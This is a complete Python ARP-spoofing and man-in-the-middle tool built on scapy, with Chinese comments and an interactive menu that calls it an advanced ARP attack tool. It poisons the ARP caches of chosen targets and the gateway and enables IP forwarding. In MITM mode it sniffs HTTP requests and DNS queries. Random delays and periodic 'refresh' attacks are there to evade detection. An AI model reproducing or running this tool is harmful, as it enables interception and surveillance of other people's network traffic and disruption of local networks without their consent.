from scapy.all import *
import psutil
import socket
import uuid
import threading
import queue
import time
import random
import logging
import sys
import os
import re
import colorama
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, Back

# 初始化彩色输出
colorama.init(autoreset=True)

def get_network_interfaces():
    """获取活跃网络接口"""
    return [
        iface for iface, addrs in psutil.net_if_addrs().items() 
        if any(addr.family == socket.AF_INET for addr in addrs)
    ]

def get_local_mac():
    """获取本地MAC地址"""
    return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

def get_local_ip(interface=None):
    """获取指定接口的IP地址"""
    if interface:
        addrs = psutil.net_if_addrs()
        for addr in addrs.get(interface, []):
            if addr.family == socket.AF_INET:
                return addr.address
    return None

def validate_ip(ip):
    """验证IP地址是否有效"""
    pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
    match = re.match(pattern, ip)
    if not match:
        return False
    
    for i in range(1, 5):
        octet = int(match.group(i))
        if octet < 0 or octet > 255:
            return False
    
    return True

class AdvancedARPSpoofing:
    def __init__(self, gateway, targets, interface):
        """
        初始化ARP欺骗攻击器
        
        :param gateway: 网关IP地址
        :param targets: 目标IP地址列表
        :param interface: 网络接口名称
        """
        self.gateway = gateway
        self.targets = targets
        self.interface = interface
        
        # 获取本地MAC和IP
        self.local_mac = get_local_mac()
        self.local_ip = get_local_ip(interface)
        
        # 设置停止事件和线程列表
        self.stop_event = threading.Event()
        self.attack_threads = []
        self.attack_timer = None
        
        # MAC地址缓存
        self.mac_cache = {}
        
        # 日志队列和日志配置
        self.attack_log_queue = queue.Queue()
        
        # 设置日志
        self.logger = logging.getLogger("arp_spoof")
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        
        # 添加控制台处理器
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)
        
        # 添加文件处理器
        try:
            file_handler = logging.FileHandler("arp_attack.log")
            file_handler.setFormatter(formatter)
            self.logger.addHandler(file_handler)
        except:
            pass  # 如果无法创建日志文件，静默失败
    
    def _get_mac_address(self, ip):
        """
        获取指定IP的MAC地址
        
        :param ip: 目标IP
        :return: MAC地址或None
        """
        # 首先检查缓存
        if ip in self.mac_cache:
            return self.mac_cache[ip]
        
        try:
            # 创建ARP请求数据包
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast/arp_request
            
            # 发送数据包并等待响应
            result = srp(packet, timeout=3, verbose=False, iface=self.interface)[0]
            
            # 提取响应的MAC地址
            if result:
                mac = result[0][1].hwsrc
                # 存入缓存
                self.mac_cache[ip] = mac
                return mac
            else:
                return None
        except Exception as e:
            self.logger.error(f"获取MAC地址失败: {e}")
            return None
    
    def _standard_arp_spoof(self, target_ip, spoof_ip):
        """
        执行标准ARP欺骗
        
        :param target_ip: 目标IP
        :param spoof_ip: 欺骗IP (通常是网关)
        """
        try:
            # 获取目标MAC地址
            target_mac = self._get_mac_address(target_ip)
            if not target_mac:
                self.attack_log_queue.put(
                    f"{Fore.RED}[!] 无法获取 {target_ip} 的MAC地址{Style.RESET_ALL}"
                )
                return
            
            # 创建ARP欺骗数据包
            arp_response = ARP(
                op=2,           # 2表示ARP响应
                pdst=target_ip, # 目标IP
                hwdst=target_mac, # 目标MAC
                psrc=spoof_ip   # 源IP(伪装成网关)
            )
            
            # 发送数据包
            send(arp_response, verbose=False, iface=self.interface)
            
            self.attack_log_queue.put(
                f"{Fore.GREEN}[+] 向 {target_ip} 发送标准ARP欺骗{Style.RESET_ALL}"
            )
            
        except Exception as e:
            self.logger.error(f"标准ARP欺骗失败: {e}")
    
    def _gratuitous_arp_attack(self, target_ip, spoof_ip):
        """
        执行免费ARP攻击
        
        :param target_ip: 目标IP
        :param spoof_ip: 欺骗IP (通常是网关)
        """
        try:
            # 针对目标发送免费ARP
            gratuitous_packet = ARP(
                op=1,
                psrc=spoof_ip,
                pdst=target_ip,
                hwsrc=self.local_mac,
                hwdst="ff:ff:ff:ff:ff:ff"
            )
            
            # 发送数据包
            send(gratuitous_packet, verbose=False, iface=self.interface)
            
            self.attack_log_queue.put(
                f"{Fore.MAGENTA}[+] 向 {target_ip} 发送免费ARP攻击{Style.RESET_ALL}"
            )
            
        except Exception as e:
            self.logger.error(f"免费ARP攻击失败: {e}")
    
    def attack_worker(self, strategy):
        """
        攻击工作线程
        
        :param strategy: 攻击策略
        """
        while not self.stop_event.is_set():
            try:
                # 对每个目标执行ARP欺骗
                for target in self.targets:
                    # 根据策略选择攻击方法
                    if strategy == 'standard' or strategy == 'mitm':
                        # 欺骗目标，让其认为我们是网关
                        self._standard_arp_spoof(target, self.gateway)
                        
                        # 对于MITM攻击，也欺骗网关
                        if strategy == 'mitm':
                            self._standard_arp_spoof(self.gateway, target)
                    
                    elif strategy == 'gratuitous':
                        # 执行免费ARP攻击
                        self._gratuitous_arp_attack(target, self.gateway)
                    
                    # 随机延迟，避免被检测
                    time.sleep(random.uniform(1.0, 3.0))
                    
                    # 检查是否停止
                    if self.stop_event.is_set():
                        break
                
            except Exception as e:
                self.logger.error(f"攻击线程错误: {e}")
                time.sleep(1)
    
    def enable_ip_forwarding(self):
        """
        启用IP转发，使攻击者可以作为中间人转发流量
        """
        try:
            # 检测操作系统并启用IP转发
            if sys.platform.startswith('win'):
                # Windows系统
                os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
                self.attack_log_queue.put(
                    f"{Fore.GREEN}[+] Windows IP转发已启用{Style.RESET_ALL}"
                )
            else:
                # Linux/Unix系统
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                self.attack_log_queue.put(
                    f"{Fore.GREEN}[+] Linux IP转发已启用{Style.RESET_ALL}"
                )
            return True
        except Exception as e:
            self.attack_log_queue.put(
                f"{Fore.RED}[!] 启用IP转发失败: {e}{Style.RESET_ALL}"
            )
            return False

    def disable_ip_forwarding(self):
        """
        禁用IP转发，还原系统设置
        """
        try:
            if sys.platform.startswith('win'):
                os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")
                self.attack_log_queue.put(
                    f"{Fore.GREEN}[+] Windows IP转发已禁用{Style.RESET_ALL}"
                )
            else:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                self.attack_log_queue.put(
                    f"{Fore.GREEN}[+] Linux IP转发已禁用{Style.RESET_ALL}"
                )
            return True
        except Exception as e:
            self.attack_log_queue.put(
                f"{Fore.RED}[!] 禁用IP转发失败: {e}{Style.RESET_ALL}"
            )
            return False

    def packet_sniffer(self, packet_filter=""):
        """
        数据包嗅探器，用于MITM攻击的流量分析
        
        :param packet_filter: 数据包过滤表达式
        """
        def packet_callback(packet):
            # 避免处理过多数据包导致CPU占用过高
            if self.stop_event.is_set():
                return
            
            # 提取有用的数据包信息
            if packet.haslayer(TCP) and packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                # 处理HTTP流量
                if packet.haslayer(Raw) and (packet.dport == 80 or packet.sport == 80):
                    try:
                        payload = packet[Raw].load.decode('utf-8', errors='ignore')
                        if "GET " in payload or "POST " in payload:
                            self.attack_log_queue.put(
                                f"{Fore.CYAN}[*] HTTP流量: {src_ip} -> {dst_ip}{Style.RESET_ALL}"
                            )
                    except:
                        pass
            
            # 处理DNS查询
            elif packet.haslayer(DNS) and packet.haslayer(IP):
                if packet.haslayer(DNSQR):
                    qname = packet[DNSQR].qname.decode('utf-8')
                    self.attack_log_queue.put(
                        f"{Fore.MAGENTA}[*] DNS查询: {packet[IP].src} -> {qname}{Style.RESET_ALL}"
                    )

        # 启动嗅探线程
        sniffer_thread = threading.Thread(
            target=lambda: sniff(
                iface=self.interface,
                filter=packet_filter,
                prn=packet_callback,
                store=0,
                stop_filter=lambda _: self.stop_event.is_set()
            ),
            daemon=True
        )
        sniffer_thread.start()
        self.attack_threads.append(sniffer_thread)
        
        self.attack_log_queue.put(
            f"{Fore.GREEN}[+] 数据包嗅探器已启动 (过滤器: {packet_filter or '无'}){Style.RESET_ALL}"
        )

    def monitor_network_activity(self):
        """
        监控网络活动，处理流量变化
        """
        try:
            # 初始化流量计数器
            last_check = time.time()
            targets_seen = {target: 0 for target in self.targets}
            
            # 启动监控线程
            monitor_thread = threading.Thread(
                target=self._network_monitor_worker,
                args=(targets_seen, last_check),
                daemon=True
            )
            monitor_thread.start()
            self.attack_threads.append(monitor_thread)
            
            self.attack_log_queue.put(
                f"{Fore.GREEN}[+] 网络活动监控已启动{Style.RESET_ALL}"
            )
        except Exception as e:
            self.logger.error(f"启动网络监控失败: {e}")

    def _network_monitor_worker(self, targets_seen, last_check):
        """
        网络监控工作线程
        
        :param targets_seen: 目标流量计数器
        :param last_check: 上次检查时间
        """
        while not self.stop_event.is_set():
            try:
                # 每30秒检查一次网络活动
                time.sleep(30)
                
                if self.stop_event.is_set():
                    return
                    
                current_time = time.time()
                
                # 检查是否有长时间未见的目标
                for target in self.targets:
                    if target not in targets_seen or targets_seen[target] < 3:
                        # 针对活动较少的目标增加攻击频率
                        self._standard_arp_spoof(target, self.gateway)
                        self._gratuitous_arp_attack(target, self.gateway)
                        
                        self.attack_log_queue.put(
                            f"{Fore.YELLOW}[!] 增强对 {target} 的攻击强度{Style.RESET_ALL}"
                        )
                
                # 重置计数器
                if current_time - last_check > 300:  # 5分钟
                    targets_seen = {target: 0 for target in self.targets}
                    last_check = current_time
                    
            except Exception as e:
                self.logger.error(f"网络监控错误: {e}")
                time.sleep(5)  # 出错后短暂等待

    def setup_attack_environment(self):
        """
        设置攻击环境，准备攻击前的配置
        """
        # 启用IP转发
        self.enable_ip_forwarding()
        
        # 备份系统ARP表
        self._backup_arp_table()
        
        # 设置攻击定时器
        self.attack_timer = threading.Timer(3600, self._refresh_attack)  # 每小时刷新一次
        self.attack_timer.daemon = True
        
        return True

    def _backup_arp_table(self):
        """
        备份系统ARP表以便后续还原
        """
        try:
            self.arp_backup = {}
            
            # 获取当前ARP表
            for target in self.targets + [self.gateway]:
                mac = self._get_mac_address(target)
                if mac:
                    self.arp_backup[target] = mac
                    
            self.attack_log_queue.put(
                f"{Fore.GREEN}[+] ARP表备份完成 ({len(self.arp_backup)} 条记录){Style.RESET_ALL}"
            )
        except Exception as e:
            self.logger.error(f"ARP表备份失败: {e}")

    def _refresh_attack(self):
        """
        刷新攻击以防被检测或失效
        """
        if self.stop_event.is_set():
            return
            
        self.attack_log_queue.put(
            f"{Fore.MAGENTA}[*] 正在刷新攻击... {Style.RESET_ALL}"
        )
        
        # 清除MAC缓存
        self.mac_cache.clear()
        
        # 对所有目标执行一次强力攻击
        for target in self.targets:
            self._standard_arp_spoof(target, self.gateway)
            self._gratuitous_arp_attack(target, self.gateway)
            
        # 重新启动计时器
        self.attack_timer = threading.Timer(3600, self._refresh_attack)
        self.attack_timer.daemon = True
        self.attack_timer.start()

    def start_attack(self, strategy='standard', threads=10, duration=None):
        """
        启动攻击
        
        :param strategy: 攻击策略
        :param threads: 并发线程数
        :param duration: 攻击持续时间(秒)
        """
        print(f"{Fore.GREEN}[*] 开始ARP攻击 {Style.RESET_ALL}")
        print(f"目标: {', '.join(self.targets)}")
        print(f"网关: {self.gateway}")
        print(f"攻击策略: {strategy}")
        print(f"本地MAC: {self.local_mac}")
        print(f"本地IP: {self.local_ip}")
        
        start_time = time.time()
        
        # 重置状态
        self.stop_event.clear()
        self.mac_cache.clear()
        
        # 设置攻击环境
        self.setup_attack_environment()
        
        # 创建并启动攻击线程
        self.attack_threads = []
        for _ in range(threads):
            thread = threading.Thread(
                target=self.attack_worker,
                args=(strategy,),
                daemon=True
            )
            thread.start()
            self.attack_threads.append(thread)
        
        # 启动网络监控
        self.monitor_network_activity()
        
        # 对于MITM攻击，启动数据包嗅探
        if strategy == 'mitm':
            self.packet_sniffer("ip")
        
        # 启动攻击刷新计时器
        self.attack_timer.start()
        
        # 如果设置了持续时间，等待指定时间后停止攻击
        if duration:
            try:
                # 无阻塞等待指定时间
                time_to_wait = start_time + duration - time.time()
                if time_to_wait > 0:
                    print(f"{Fore.YELLOW}[*] 攻击将在 {duration} 秒后自动停止{Style.RESET_ALL}")
                    time.sleep(time_to_wait)
                self.stop_attack()
            except KeyboardInterrupt:
                self.stop_attack()
        else:
            # 无限期攻击，直到Ctrl+C
            try:
                print(f"{Fore.YELLOW}[*] 攻击运行中，按Ctrl+C停止...{Style.RESET_ALL}")
                # 主线程等待，保持程序运行
                while not self.stop_event.is_set():
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop_attack()

    def stop_attack(self):
        """
        立即停止所有攻击线程
        """
        print(f"\n{Fore.RED}[!] 正在停止攻击...{Style.RESET_ALL}")
        self.stop_event.set()
        
        # 停止计时器
        if hasattr(self, 'attack_timer') and self.attack_timer:
            self.attack_timer.cancel()
        
        # 强制等待所有线程终止，最多等待5秒
        wait_time = 0
        while any(t.is_alive() for t in self.attack_threads) and wait_time < 5:
            time.sleep(0.5)
            wait_time += 0.5
        
        # 如果仍有线程活跃，打印警告
        if any(t.is_alive() for t in self.attack_threads):
            print(f"{Fore.RED}[!] 部分攻击线程仍在运行，强制继续...{Style.RESET_ALL}")
        
        # 禁用IP转发
        self.disable_ip_forwarding()
        
        print(f"{Fore.GREEN}[✓] 攻击已停止{Style.RESET_ALL}")

    def restore_arp_table(self):
        """
        还原ARP表
        """
        print(f"{Fore.CYAN}[*] 正在执行网络还原... {Style.RESET_ALL}")
        
        # 确保攻击已停止
        self.stop_event.set()
        
        # 等待线程终止
        time.sleep(1)
        
        for target in self.targets:
            try:
                target_mac = self.arp_backup.get(target) if hasattr(self, 'arp_backup') else self._get_mac_address(target)
                gateway_mac = self.arp_backup.get(self.gateway) if hasattr(self, 'arp_backup') else self._get_mac_address(self.gateway)
                
                if not target_mac or not gateway_mac:
                    continue
                
                # 向目标发送正确的网关MAC
                restore_target = ARP(
                    op=2, 
                    pdst=target, 
                    hwdst=target_mac, 
                    psrc=self.gateway, 
                    hwsrc=gateway_mac
                )
                
                # 向网关发送正确的目标MAC
                restore_gateway = ARP(
                    op=2, 
                    pdst=self.gateway, 
                    hwdst=gateway_mac, 
                    psrc=target, 
                    hwsrc=target_mac
                )
                
                # 多次发送以确保还原成功
                for _ in range(5):
                    send(restore_target, verbose=False)
                    send(restore_gateway, verbose=False)
                    time.sleep(0.2)
                
                print(f"{Fore.GREEN}[✓] 已还原 {target} 的ARP表{Style.RESET_ALL}")
                
            except Exception as e:
                self.logger.error(f"还原 {target} 失败: {e}")
        
        # 额外发送一次免费ARP广播以加速更新
        try:
            for ip, mac in self.arp_backup.items() if hasattr(self, 'arp_backup') else []:
                gratuitous_packet = ARP(
                    op=1,
                    psrc=ip,
                    pdst=ip,
                    hwsrc=mac,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                send(gratuitous_packet, verbose=False, count=2)
        except Exception as e:
            self.logger.error(f"发送免费ARP更新失败: {e}")

def main():
    try:
        print(f"{Fore.MAGENTA}")
        print("=" * 50)
        print("🔥 高级ARP攻击工具 v1.0 🔥".center(50))
        print("=" * 50)
        print(f"{Style.RESET_ALL}")
        
        # 网络接口选择
        interfaces = get_network_interfaces()
        print(f"{Fore.MAGENTA}可用网络接口:{Style.RESET_ALL}")
        for idx, interface in enumerate(interfaces, 1):
            print(f"{idx}. {interface}")
        
        interface_choice = input(f"{Fore.CYAN}选择网络接口(序号): {Style.RESET_ALL}").strip()
        interface = interfaces[int(interface_choice) - 1]
        
        # 网关输入
        while True:
            gateway = input(f"{Fore.CYAN}输入网关IP: {Style.RESET_ALL}").strip()
            if validate_ip(gateway):
                break
            print(f"{Fore.RED}[!] 无效的IP地址{Style.RESET_ALL}")
        
        # 目标输入
        targets = []
        while True:
            target_input = input(f"{Fore.CYAN}输入目标IP(多个用逗号分隔,回车结束): {Style.RESET_ALL}").strip()
            
            if not target_input:
                break
            
            target_ips = [ip.strip() for ip in target_input.split(',')]
            valid_targets = [ip for ip in target_ips if validate_ip(ip)]
            
            if valid_targets:
                targets.extend(valid_targets)
                print(f"{Fore.GREEN}[+] 已添加目标: {', '.join(valid_targets)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] 未检测到有效IP{Style.RESET_ALL}")
        
        if not targets:
            print(f"{Fore.RED}[!] 未指定有效目标{Style.RESET_ALL}")
            return
        
        # 攻击策略选择
        print(f"\n{Fore.GREEN}可用攻击策略:{Style.RESET_ALL}")
        print("1. 标准ARP攻击 (standard)")
        print("2. 免费ARP攻击 (gratuitous)")
        print("3. MITM中间人攻击 (mitm)")
        
        strategy_map = {
            '1': 'standard', 
            '2': 'gratuitous', 
            '3': 'mitm'
        }
        
        strategy_choice = input(f"{Fore.YELLOW}选择攻击策略(1-3): {Style.RESET_ALL}").strip()
        strategy = strategy_map.get(strategy_choice, 'standard')
        
        # 新增选项：是否启用数据包嗅探
        enable_sniffing = False
        if strategy == 'mitm':
            sniff_choice = input(f"{Fore.YELLOW}是否启用数据包嗅探? (y/n): {Style.RESET_ALL}").strip().lower()
            enable_sniffing = sniff_choice == 'y'
        
        # 攻击持续时间选择
        while True:
            try:
                duration_input = input(f"{Fore.CYAN}输入攻击持续时间(秒)，留空默认持续攻击: {Style.RESET_ALL}").strip()
                
                if not duration_input:
                    duration = None
                    break
                
                duration = int(duration_input)
                if duration > 0:
                    break
                else:
                    print(f"{Fore.RED}[!] 持续时间必须为正整数{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] 请输入有效的数字{Style.RESET_ALL}")
        
        # 并发线程数选择
        while True:
            try:
                threads_input = input(f"{Fore.CYAN}输入并发线程数(默认10): {Style.RESET_ALL}").strip()
                
                if not threads_input:
                    threads = 10
                    break
                
                threads = int(threads_input)
                if 1 <= threads <= 50:
                    break
                else:
                    print(f"{Fore.RED}[!] 线程数必须在1-50之间{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] 请输入有效的数字{Style.RESET_ALL}")
        
        # 创建攻击实例
        arp_attack = AdvancedARPSpoofing(gateway, targets, interface)
        
        try:
            # 开始攻击
            arp_attack.start_attack(strategy, threads, duration)
        
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] 攻击已手动中断 {Style.RESET_ALL}")
        
        finally:
            # 确保还原网络
            print(f"{Fore.GREEN}[*] 正在执行网络还原...{Style.RESET_ALL}")
            arp_attack.restore_arp_table()
            print(f"{Fore.GREEN}[✓] 网络已成功还原{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] 执行过程中发生错误: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()